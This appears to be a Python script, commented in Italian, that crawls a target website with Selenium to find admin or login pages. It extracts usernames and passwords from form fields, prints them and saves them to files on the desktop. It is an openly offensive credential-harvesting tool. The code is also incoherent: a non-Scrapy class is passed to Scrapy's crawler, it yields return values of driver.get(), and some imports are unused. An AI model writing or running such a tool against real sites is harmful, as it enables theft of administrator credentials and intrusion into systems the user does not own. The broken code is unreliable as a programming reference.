import argparse
import os
import re
import requests
from bs4 import BeautifulSoup
from scrapy.crawler import CrawlerProcess
from scrapy.spiders import Rule
from scrapy.linkextractors import LinkExtractor
from urllib.parse import urljoin, urlparse
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager

def is_login_page(response):
    # Controllo semplice per le pagine di accesso, è possibile aggiungere ulteriori condizioni
    return "login" in response.url.lower() or "admin" in response.url.lower()

def extract_credentials(form):
    username_field = form.find("input", {"name": "username"}) or form.find("input", {"id": "username"})
    password_field = form.find("input", {"name": "password"}) or form.find("input", {"id": "password"})

    if username_field and password_field:
        username = username_field["value"] if "value" in username_field.attrs else ""
        password = password_field["value"] if "value" in password_field.attrs else ""
        return username, password

    # Tentativo di estrarre le credenziali utilizzando i modelli di espressione regolare
    username_pattern = r'name="username" value="([^"]+)"'
    password_pattern = r'name="password" value="([^"]+)"'
    username = re.search(username_pattern, form.prettify(), re.IGNORECASE)
    password = re.search(password_pattern, form.prettify(), re.IGNORECASE)

    if username and password:
        return username.group(1), password.group(1)

    return "", ""

class AdminLoginSpider:
    name = "admin_login_spider"

    def __init__(self):
        self.driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))

    def start_requests(self):
        yield self.driver.get(self.start_urls[0])

    def parse(self, response):
        soup = BeautifulSoup(self.driver.page_source, "html.parser")

        # Trova il modulo di accesso e estrae le credenziali
        form = soup.find("form", {"method": "post"})
        if form and is_login_page(response):
            username, password = extract_credentials(form)
            if username and password:
                print("\u2620 Trovate le credenziali dell'amministratore:")
                print(f"  Nome utente: {username}")
                print(f"  Password: {password}")

                # Salva le credenziali in un file sul desktop
                desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
                filename = "admin_credentials_{}.txt"
                counter = 1
                filepath = os.path.join(desktop_path, filename.format(counter))

                while os.path.exists(filepath):
                    counter += 1
                    filepath = os.path.join(desktop_path, filename.format(counter))

                with open(filepath, "w") as f:
                    f.write(f"Nome utente: {username}\n")
                    f.write(f"Password: {password}\n\n")

                self.driver.quit()
                return

        # Segui i collegamenti e crawla ulteriormente
        for link in soup.find_all("a", href=True):
            yield self.driver.get(link["href"])

def main(args):
    process = CrawlerProcess()
    process.crawl(AdminLoginSpider, start_urls=[args.url])
    process.start()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Scanner web automatizzato per le pagine di accesso dell'amministratore e l'estrazione delle credenziali")
    parser.add_argument("url", help="URL di destinazione")
    args = parser.parse_args()

    main(args)
